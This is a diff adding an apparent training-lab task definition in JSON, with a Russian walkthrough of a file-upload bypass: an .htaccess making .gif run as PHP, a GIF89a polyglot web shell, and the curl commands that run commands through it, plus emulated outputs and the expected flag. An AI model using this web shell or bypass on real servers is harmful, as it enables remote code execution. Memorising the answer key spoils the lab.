@@ -1,0 +1,25 @@
+{
+  "id": "web-file-upload-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{ht4cc3ss_p0lygl0t_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: .htaccess + полиглот → RCE\n\nЗагрузчик `https://profile.example/upload` принимает только картинки\n(проверка magic bytes). Обычный `shell.php` отбивается.\n\n1. Загрузи `.htaccess`, чтобы Apache исполнял `.gif` как PHP:\n\n   curl -s -F 'file=@.htaccess' https://profile.example/upload\n\n2. Загрузи полиглот `shell.gif` (начинается с GIF89a — magic bytes картинки, внутри PHP):\n\n   curl -s -F 'file=@shell.gif' https://profile.example/upload\n\n3. Обратись к загруженному файлу с командой (флаг — в flag.txt):\n\n   curl -s 'https://profile.example/uploads/shell.gif?c=cat flag.txt' > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/.htaccess", "text": "AddType application/x-httpd-php .gif\n" },
+    { "path": "/home/student/task/shell.gif", "text": "GIF89a<?php system($_GET['c']); ?>\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция profile.example)",
+      "cases": [
+        { "match": "uploads/shell\\.gif\\?c=cat|shell\\.gif\\?c=cat|flag\\.txt", "example": "-s 'https://profile.example/uploads/shell.gif?c=cat flag.txt'", "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nnto{ht4cc3ss_p0lygl0t_rce}\n" },
+        { "match": "uploads/shell\\.gif", "example": "-s 'https://profile.example/uploads/shell.gif?c=id'", "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n" },
+        { "match": "htaccess", "example": "-F 'file=@.htaccess' https://profile.example/upload", "output": "{\"ok\":true,\"url\":\"/uploads/.htaccess\"}\n" },
+        { "match": "shell\\.php", "example": "-F 'file=@shell.php' https://profile.example/upload", "output": "{\"error\":\"only images allowed (jpg/png)\"}\n" },
+        { "match": "shell\\.gif|upload", "example": "-F 'file=@shell.gif' https://profile.example/upload", "output": "{\"ok\":true,\"url\":\"/uploads/shell.gif\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /upload и /uploads/shell.gif на profile.example.\n"
+    }
+  }
+}
